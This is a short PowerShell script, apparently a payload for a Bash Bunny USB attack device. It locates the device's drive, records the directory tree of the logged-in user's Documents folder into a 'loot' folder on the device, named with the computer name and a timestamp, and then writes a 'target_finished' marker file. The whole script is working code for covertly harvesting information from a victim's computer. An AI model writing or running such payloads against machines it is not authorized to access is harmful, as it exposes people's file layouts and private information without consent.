# Find the driveletter of the bunny
$drive = ((gwmi win32_volume -f 'label=''BUNNY''').Name)

# The payload itself. Get the directory structure of the document folder
$date = Get-Date -format "yyyyMMdd_HHmmss"
$filename= $drive + "loot\" + $env:COMPUTERNAME + "_" + $date + "_doc_tree.txt"
tree c:\users\${env:username}\Documents > $filename

# Tell pi that we are finished by creating a file called target_finished in the root of the bunny storage 
New-Item ($drive + "target_finished") -type file
